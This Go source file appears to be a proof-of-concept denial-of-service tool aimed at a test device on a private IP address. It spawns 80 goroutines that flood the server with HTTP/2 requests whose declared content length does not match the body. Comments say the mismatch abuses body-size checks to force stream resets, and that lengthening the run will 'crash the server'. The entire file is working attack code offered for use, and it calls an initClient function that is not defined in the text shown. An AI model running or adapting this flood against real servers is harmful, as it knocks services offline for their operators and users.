package main

import (
	"bytes"
	"crypto/tls"
	"encoding/pem"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"time"
)

var (
	listenPort = flag.Int("listen_port", 443, "Server listening port")
	certFile   = flag.String("cert_file", "server.crt", "TLS server cert")
	numWorkers = flag.Int("num_workers", 80, "number of async workers")
)

func fetchAndSaveServerCert(serverURL string, certFile string) error {
	conn, err := tls.Dial("tcp", serverURL, &tls.Config{
		InsecureSkipVerify: true,
	})
	if err != nil {
		return fmt.Errorf("failed to connect: %v", err)
	}
	defer conn.Close()

	certs := conn.ConnectionState().PeerCertificates
	if len(certs) == 0 {
		return fmt.Errorf("no certificates found")
	}

	// Open or create the certificate file
	file, err := os.Create(certFile)
	if err != nil {
		return fmt.Errorf("failed to create file: %v", err)
	}
	defer file.Close()

	// Iterate over all certificates and write them to the file
	for idx, cert := range certs {
		// URL-decode the raw certificate bytes
		// decodedCert, err := url.QueryUnescape(string(cert.Raw))
		// if err != nil {
		// 	return fmt.Errorf("failed to URL decode certificate %d: %v", idx, err)
		// }

		pemBlock := &pem.Block{
			Type:  "CERTIFICATE",
			Bytes: cert.Raw,
		}

		if err := pem.Encode(file, pemBlock); err != nil {
			return fmt.Errorf("failed to write certificate %d to file: %v", idx, err)
		}
	}

	fmt.Println("Certificate written to", certFile, "successfully")
	return nil
}

func asyncWorker(workerId int, serverUrl *url.URL) {
	// Abuse the checks on body size to send Stream RSTs
	// https://go.googlesource.com/net/+/master/http2/transport.go#1748
	client := initClient()
	for i := 0; ; i++ {
		request := &http.Request{
			URL:           serverUrl,
			ContentLength: 2,
			Body:          io.NopCloser(bytes.NewReader([]byte("test"))),
		}
		client.Do(request)
		// log.Printf("[worker %d] request %d: %s", workerId, i, err)
	}
}

func main() {
	// Connect to Test Device Instance
	serverUrl, err := url.Parse(fmt.Sprintf("https://192.168.130.129:%d", *listenPort))
	if err != nil {
		log.Fatalf("failed to parse internal URL: %s", err)
	}
	err = fetchAndSaveServerCert(serverUrl.Host, *certFile)
	if err != nil {
		log.Fatalf("failed to fetch server certificate: %s", err)
	}
	fmt.Println("Server URL:", serverUrl)

	for i := 0; i < *numWorkers; i++ {
		go asyncWorker(i, serverUrl)
	}

	// Change to longer period to crash the server
	time.Sleep(10 * time.Second)
}
